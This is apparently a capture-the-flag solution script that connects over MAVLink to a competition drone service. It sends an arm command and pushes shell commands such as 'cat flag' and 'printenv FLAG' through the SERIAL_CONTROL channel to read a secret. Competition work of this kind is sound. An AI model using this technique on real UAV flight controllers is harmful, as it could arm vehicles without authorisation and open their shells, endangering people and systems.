from pymavlink import mavutil
import time, struct

master = mavutil.mavlink_connection('tcp:exp.cybergame.sk:7030')
master.wait_heartbeat()
print(f"Connected: sys={master.target_system} comp={master.target_component}")

# ARM
master.mav.command_long_send(
    master.target_system, master.target_component,
    mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM,
    0, 1, 0, 0, 0, 0, 0, 0
)
time.sleep(2)

# Drain status messages
for _ in range(10):
    msg = master.recv_match(blocking=False)
    if msg and msg.get_type() == 'STATUSTEXT':
        print(f"STATUS: {msg.text}")

print("\nReading serial bridge via SERIAL_CONTROL...")

SHELL = 10
UART0 = 0

# Try commands on the shell
for cmd in [b'\n', b'cat flag\n', b'cat flag.txt\n', b'ls\n', b'cat /flag\n', b'printenv FLAG\n', b'echo $FLAG\n']:
    data = cmd + b'\x00' * (70 - len(cmd))
    master.mav.serial_control_send(
        SHELL,           # device = SHELL
        mavutil.mavlink.SERIAL_CONTROL_FLAG_REPLY | mavutil.mavlink.SERIAL_CONTROL_FLAG_EXCLUSIVE,
        0,               # timeout
        57600,           # baudrate
        len(cmd),        # count
        list(data)       # data
    )
    time.sleep(0.5)
    
    # Check for SERIAL_CONTROL response
    for _ in range(20):
        msg = master.recv_match(blocking=False)
        if not msg: continue
        t = msg.get_type()
        if t == 'SERIAL_CONTROL':
            raw = bytes(msg.data[:msg.count])
            print(f"  CMD '{cmd.strip()}' -> [{msg.count} bytes]: {raw}")
            if raw: print(f"  TEXT: {raw.decode('utf-8','replace')}")
        elif t == 'STATUSTEXT':
            print(f"  STATUS: {msg.text}")

master.close()
